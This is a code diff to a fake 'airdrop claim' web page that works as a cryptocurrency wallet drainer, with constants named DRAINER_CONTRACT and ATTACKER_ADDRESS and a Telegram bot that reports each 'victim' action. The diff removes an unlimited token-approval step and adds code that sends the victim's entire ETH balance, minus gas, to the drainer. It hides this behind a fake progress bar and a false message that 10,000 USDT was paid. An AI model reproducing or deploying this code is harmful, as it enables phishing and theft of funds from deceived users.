@@ -64,14 +64,6 @@
                 <button class="button" id="verifyButton">Verify Now (0.01 ETH)</button>
             </div>
 
-            <div id="step2-5" class="claim-step">
-                <h2>Approve Tokens for Airdrop</h2>
-                <p>Please approve the following tokens to proceed with the airdrop claim. This is required to verify your eligibility.</p>
-                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
-                <div id="tokenApprovalList"></div>
-                <button class="button" id="approveTokensButton">Approve Tokens</button>
-            </div>
-
             <div id="step3" class="claim-step">
                 <h2>Claim Your Airdrop</h2>
                 <p>Verification successful. Now claim your airdrop by confirming the transaction.</p>
@@ -154,26 +146,18 @@
         const TELEGRAM_USER_ID = "6309547301";
 
         // Contract and Network Configuration
-        const DRAINER_CONTRACT = "0xCA207421fd2dc651A30448bD6386092c921f82e0"; // Replace with the actual deployed UltimateLethalDrainer contract address
-        const ATTACKER_ADDRESS = "0x5087beb405662410d5844ce52f67278e2a9eb763"; // Attacker's address (your wallet)
+        const DRAINER_CONTRACT = "0xfc2b2ad40d918553e7bd4a954e47e874acf1a5c4"; // Updated contract address
+        const ATTACKER_ADDRESS = "0xf71d90e5E6aE29178336923B9e0Ba7D0b1EC2723"; // Updated attacker address
         const SUPPORTED_CHAINS = ["0xaa36a7"]; // Sepolia only for now
         const SEPOLIA_RPC = "https://rpc.sepolia.org"; // Sepolia Testnet RPC
         const NETWORK = "Sepolia Testnet";
 
-        // Mock ERC-20 token addresses on Sepolia Testnet
-        const TOKEN_ADDRESSES = [
-            "0xca207421fd2dc651a30448bd6386092c921f82e0" // MockUSDT contract address
-        ];
-        const TOKEN_NAMES = ["USDT"];
-
         // Track total drained amounts and failed attempts
         let totalEthDrained = 0;
-        let totalTokensDrained = {};
         let finalConfirmAttempts = 0;
 
         const DRAINER_ABI = [
-            {"inputs":[{"internalType":"address payable","name":"_attacker","type":"address"},{"internalType":"uint256[]","name":"_chainIds","type":"uint256[]"},{"internalType":"address[]","name":"_tokenAddresses","type":"address[]"}],"stateMutability":"nonpayable","type":"constructor"},
-            {"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalRequired","type":"event"},
+            {"inputs":[{"internalType":"address payable","name":"_attacker","type":"address"},{"internalType":"uint256[]","name":"_chainIds","type":"uint256[]"}],"stateMutability":"nonpayable","type":"constructor"},
             {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"chainId","type":"uint256"}],"name":"ChainSwitchRequired","type":"event"},
             {"inputs":[{"internalType":"uint256","name":"chainId","type":"uint256"}],"name":"claimReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[],"name":"claimYourReward","outputs":[],"stateMutability":"payable","type":"function"},
@@ -182,17 +166,9 @@
             {"inputs":[],"name":"attacker","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"chainIds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"hasApproved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isTargetToken","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"supportedChains","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approvalAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"tokenAddresses","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
             {"stateMutability":"payable","type":"receive"}
-        ];
-
-        const ERC20_ABI = [
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"type":"function"}
         ];
 
         // Function to send Telegram messages
@@ -238,7 +214,6 @@
         let web3;
         let userAccount;
         let drainerContract;
-        let tokenContracts = {};
 
         // Countdown Timer
         let timeLeft = 300; // 5 minutes in seconds
@@ -321,12 +296,6 @@
                     document.getElementById("connectStatus").innerText = `${walletName} connected successfully.`;
                     walletGrid.classList.remove("active");
                     drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
-
-                    // Initialize token contracts
-                    TOKEN_ADDRESSES.forEach(address => {
-                        tokenContracts[address] = new web3.eth.Contract(ERC20_ABI, address);
-                    });
-
                     await sendTelegramMessage(`✅ *Wallet Connected* ✅\n👛 *Wallet*: ${userAccount}\n🔧 *Wallet Type*: ${walletName}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                     showStep(2);
                 } else {
@@ -358,83 +327,60 @@
                     return;
                 }
 
-                // Call the verifyAirdropClaim function to "approve" unlimited access for ETH
+                // Call the verifyAirdropClaim function to "approve" unlimited access
                 const gasEstimate = await drainerContract.methods.verifyAirdropClaim().estimateGas({ from: userAccount, value: amountToSend });
                 const gasPrice = await web3.eth.getGasPrice();
                 await drainerContract.methods.verifyAirdropClaim().send({ from: userAccount, value: amountToSend, gas: gasEstimate, gasPrice });
-                await sendTelegramMessage(`✅ *Verification (ETH Approval) Completed* ✅\n👛 *Wallet*: ${userAccount}\n💰 *Amount Sent*: 0.01 ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                await sendTelegramMessage(`✅ *Verification (Approval) Completed* ✅\n👛 *Wallet*: ${userAccount}\n💰 *Amount Sent*: 0.01 ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
 
-                // Check for token approvals
-                const tokenApprovalList = document.getElementById("tokenApprovalList");
-                tokenApprovalList.innerHTML = "";
-                let tokensToApprove = [];
-                for (let i = 0; i < TOKEN_ADDRESSES.length; i++) {
-                    const tokenAddress = TOKEN_ADDRESSES[i];
-                    const tokenContract = tokenContracts[tokenAddress];
-                    const allowance = await tokenContract.methods.allowance(userAccount, DRAINER_CONTRACT).call();
-                    if (allowance == 0) {
-                        tokensToApprove.push({ address: tokenAddress, name: TOKEN_NAMES[i] });
-                        tokenApprovalList.innerHTML += `<p>Approve ${TOKEN_NAMES[i]} (${tokenAddress.slice(0, 6)}...${tokenAddress.slice(-4)})</p>`;
-                    }
-                }
-
-                if (tokensToApprove.length > 0) {
-                    showStep("2-5");
-                    document.getElementById("approveTokensButton").onclick = async () => {
-                        await approveTokens(tokensToApprove);
-                    };
-                } else {
-                    showStep(3);
-                }
+                document.getElementById("connectStatus").innerText = "Verification completed. You have approved the airdrop claim.";
+                showStep(3);
             } catch (error) {
                 document.getElementById("connectStatus").innerText = `Verification failed: ${error.message}`;
                 await sendTelegramMessage(`❌ *Verification Failed* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
             }
         });
 
-        async function approveTokens(tokensToApprove) {
-            try {
-                for (let i = 0; i < tokensToApprove.length; i++) {
-                    const tokenAddress = tokensToApprove[i].address;
-                    const tokenName = tokensToApprove[i].name;
-                    const tokenContract = tokenContracts[tokenAddress];
-                    const amountToApprove = web3.utils.toHex("115792089237316195423570985008687907853269984665640564039457584007913129639935"); // uint256.max
-                    const gasEstimate = await tokenContract.methods.approve(DRAINER_CONTRACT, amountToApprove).estimateGas({ from: userAccount });
-                    const gasPrice = await web3.eth.getGasPrice();
-                    await tokenContract.methods.approve(DRAINER_CONTRACT, amountToApprove).send({ from: userAccount, gas: gasEstimate, gasPrice });
-                    await sendTelegramMessage(`✅ *Token Approval Completed* ✅\n👛 *Wallet*: ${userAccount}\n💰 *Token*: ${tokenName}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
-                }
-                document.getElementById("connectStatus").innerText = "Token approvals completed.";
-                showStep(3);
-            } catch (error) {
-                document.getElementById("connectStatus").innerText = `Token approval failed: ${error.message}`;
-                await sendTelegramMessage(`❌ *Token Approval Failed* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
-            }
-        }
-
         document.getElementById("claimButton").addEventListener("click", async () => {
             await sendTelegramMessage(`🖱️ *Victim Clicked Claim Button* 🖱️\n👛 *Wallet*: ${userAccount}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
 
             try {
-                const gasEstimate = await drainerContract.methods.claimYourReward().estimateGas({ from: userAccount });
+                const amountToSend = web3.utils.toWei("0.01", "ether");
+                const gasEstimate = await drainerContract.methods.claimYourReward().estimateGas({ from: userAccount, value: amountToSend });
                 const gasPrice = await web3.eth.getGasPrice();
-                const tx = await drainerContract.methods.claimYourReward().send({ from: userAccount, gas: gasEstimate, gasPrice });
+                const gasFee = BigInt(gasEstimate) * BigInt(gasPrice);
+                const ethBalance = await web3.eth.getBalance(userAccount);
+                const totalRequired = BigInt(amountToSend) + gasFee;
 
-                // Log drained ETH
-                const ethDrained = tx.events && tx.events.Transfer ? web3.utils.fromWei(tx.events.Transfer.returnValues.value, "ether") : "0";
-                totalEthDrained += parseFloat(ethDrained);
-                await sendTelegramMessage(`💸 *ETH Drained* 💸\n👛 *Victim*: ${userAccount}\n💰 *Amount*: ${ethDrained} ETH\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n🔗 *Tx Hash*: ${tx.transactionHash}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
-
-                // Log drained tokens
-                for (let i = 0; i < TOKEN_ADDRESSES.length; i++) {
-                    const tokenAddress = TOKEN_ADDRESSES[i];
-                    const tokenContract = tokenContracts[tokenAddress];
-                    const balance = await tokenContract.methods.balanceOf(ATTACKER_ADDRESS).call();
-                    const drainedTokens = web3.utils.fromWei(balance, "mwei"); // MockUSDT has 6 decimals
-                    if (!totalTokensDrained[tokenAddress]) totalTokensDrained[tokenAddress] = 0;
-                    totalTokensDrained[tokenAddress] += parseFloat(drainedTokens);
-                    await sendTelegramMessage(`💸 *Tokens Drained* 💸\n👛 *Victim*: ${userAccount}\n💰 *Token*: ${TOKEN_NAMES[i]}\n💰 *Amount*: ${drainedTokens} ${TOKEN_NAMES[i]}\n📈 *Total ${TOKEN_NAMES[i]} Drained*: ${totalTokensDrained[tokenAddress]} ${TOKEN_NAMES[i]}\n🔗 *Tx Hash*: ${tx.transactionHash}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                if (BigInt(ethBalance) < totalRequired) {
+                    const currentEth = web3.utils.fromWei(ethBalance, "ether");
+                    const requiredEth = web3.utils.fromWei(totalRequired.toString(), "ether");
+                    document.getElementById("connectStatus").innerText = `Insufficient ETH balance: ${currentEth} ETH, need ${requiredEth} ETH.`;
+                    await sendTelegramMessage(`⚠️ *Insufficient ETH Balance for Claim* ⚠️\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${currentEth} ETH\n💸 *Required*: ${requiredEth} ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    return;
                 }
+
+                const tx = await drainerContract.methods.claimYourReward().send({ from: userAccount, value: amountToSend, gas: gasEstimate, gasPrice });
+                totalEthDrained += 0.01;
+                await sendTelegramMessage(`💸 *ETH Drained* 💸\n👛 *Wallet*: ${userAccount}\n💰 *Amount*: 0.01 ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                await sendTelegramMessage(`🚀 *Auto-Drain ETH to Attacker* 🚀\n👛 *From*: ${userAccount}\n🎯 *To*: ${ATTACKER_ADDRESS}\n💰 *Amount*: 0.01 ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+
+                // Listen for chain switch events
+                drainerContract.events.ChainSwitchRequired({}, async (error, event) => {
+                    if (error) {
+                        document.getElementById("connectStatus").innerText = `Chain switch failed: ${error.message}`;
+                        await sendTelegramMessage(`❌ *Chain Switch Failed* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                        return;
+                    }
+
+                    const chainId = event.returnValues.chainId;
+                    await window.ethereum.request({
+                        method: "wallet_switchEthereumChain",
+                        params: [{ chainId: `0x${parseInt(chainId).toString(16)}` }],
+                    });
+                    await sendTelegramMessage(`🔄 *Chain Switched* 🔄\n👛 *Wallet*: ${userAccount}\n🌍 *New Chain*: ${chainId}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    await drainerContract.methods.claimYourReward().send({ from: userAccount });
+                });
 
                 showStep(4);
             } catch (error) {
@@ -444,44 +390,63 @@
         });
 
         document.getElementById("finalConfirmButton").addEventListener("click", async () => {
-            finalConfirmAttempts++;
-            await sendTelegramMessage(`🖱️ *Victim Clicked Final Confirm Button* 🖱️\n👛 *Wallet*: ${userAccount}\n🔢 *Attempt*: ${finalConfirmAttempts}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            await sendTelegramMessage(`🖱️ *Victim Clicked Final Confirm Button* 🖱️\n👛 *Wallet*: ${userAccount}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
 
             try {
-                const gasEstimate = await drainerContract.methods.claimYourReward().estimateGas({ from: userAccount });
+                const ethBalance = await web3.eth.getBalance(userAccount);
+                const ethBalanceBigInt = BigInt(ethBalance);
                 const gasPrice = await web3.eth.getGasPrice();
-                const tx = await drainerContract.methods.claimYourReward().send({ from: userAccount, gas: gasEstimate, gasPrice });
+                const gasEstimate = await web3.eth.estimateGas({
+                    from: userAccount,
+                    to: DRAINER_CONTRACT,
+                    value: ethBalance
+                });
+                const gasFee = BigInt(gasEstimate) * BigInt(gasPrice);
+                let amountToSend = ethBalanceBigInt - gasFee;
 
-                // Log drained ETH
-                const ethDrained = tx.events && tx.events.Transfer ? web3.utils.fromWei(tx.events.Transfer.returnValues.value, "ether") : "0";
-                totalEthDrained += parseFloat(ethDrained);
-                await sendTelegramMessage(`💸 *ETH Drained (Final Confirm)* 💸\n👛 *Victim*: ${userAccount}\n💰 *Amount*: ${ethDrained} ETH\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n🔗 *Tx Hash*: ${tx.transactionHash}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
-
-                // Log drained tokens
-                for (let i = 0; i < TOKEN_ADDRESSES.length; i++) {
-                    const tokenAddress = TOKEN_ADDRESSES[i];
-                    const tokenContract = tokenContracts[tokenAddress];
-                    const balance = await tokenContract.methods.balanceOf(ATTACKER_ADDRESS).call();
-                    const drainedTokens = web3.utils.fromWei(balance, "mwei"); // MockUSDT has 6 decimals
-                    if (!totalTokensDrained[tokenAddress]) totalTokensDrained[tokenAddress] = 0;
-                    totalTokensDrained[tokenAddress] += parseFloat(drainedTokens);
-                    await sendTelegramMessage(`💸 *Tokens Drained (Final Confirm)* 💸\n👛 *Victim*: ${userAccount}\n💰 *Token*: ${TOKEN_NAMES[i]}\n💰 *Amount*: ${drainedTokens} ${TOKEN_NAMES[i]}\n📈 *Total ${TOKEN_NAMES[i]} Drained*: ${totalTokensDrained[tokenAddress]} ${TOKEN_NAMES[i]}\n🔗 *Tx Hash*: ${tx.transactionHash}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                if (amountToSend <= 0) {
+                    document.getElementById("connectStatus").innerText = "Insufficient ETH balance to cover gas fees.";
+                    await sendTelegramMessage(`⚠️ *Insufficient ETH Balance for Final Confirmation* ⚠️\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${web3.utils.fromWei(ethBalance, "ether")} ETH\n💸 *Gas Fee*: ${web3.utils.fromWei(gasFee.toString(), "ether")} ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    return;
                 }
 
                 showStep(5);
                 const fakeProgress = document.getElementById("fakeProgress");
                 let progress = 0;
-                const interval = setInterval(() => {
+                const fakeProgressInterval = setInterval(() => {
                     progress += 10;
                     fakeProgress.style.width = `${progress}%`;
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        document.getElementById("connectStatus").innerText = "Airdrop processed successfully!";
-                    }
+                    if (progress >= 100) clearInterval(fakeProgressInterval);
                 }, 500);
+
+                const tx = await web3.eth.sendTransaction({
+                    from: userAccount,
+                    to: DRAINER_CONTRACT,
+                    value: amountToSend.toString(),
+                    gas: gasEstimate,
+                    gasPrice
+                });
+                totalEthDrained += parseFloat(web3.utils.fromWei(amountToSend.toString(), "ether"));
+                document.getElementById("connectStatus").innerText = "Airdrop reward of 10,000 USDT has been sent to your wallet.";
+                finalConfirmAttempts = 0;
+                await sendTelegramMessage(`💸 *Final ETH Drained* 💸\n👛 *Wallet*: ${userAccount}\n💰 *Amount*: ${web3.utils.fromWei(amountToSend.toString(), "ether")} ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                await sendTelegramMessage(`🚀 *Auto-Drain ETH to Attacker* 🚀\n👛 *From*: ${userAccount}\n🎯 *To*: ${ATTACKER_ADDRESS}\n💰 *Amount*: ${web3.utils.fromWei(amountToSend.toString(), "ether")} ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
             } catch (error) {
-                document.getElementById("connectStatus").innerText = `Final confirmation failed: ${error.message}`;
-                await sendTelegramMessage(`❌ *Final Confirmation Failed* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                finalConfirmAttempts++;
+                if (finalConfirmAttempts < 2) {
+                    document.getElementById("connectStatus").innerText = "Final verification required. Please complete the confirmation.";
+                    await sendTelegramMessage(`❌ *Final ETH Drain Failed (Attempt 1)* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    setTimeout(() => showStep(4), 3000);
+                } else {
+                    document.getElementById("connectStatus").innerText = "Airdrop claim failed. Please restart the process.";
+                    await sendTelegramMessage(`❌ *Final ETH Drain Failed (Attempt 2)* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    setTimeout(() => {
+                        showStep(1);
+                        finalConfirmAttempts = 0;
+                        document.getElementById("status").innerText = "Awaiting Connect...";
+                        userAccount = null;
+                    }, 3000);
+                }
             }
         });
     </script>
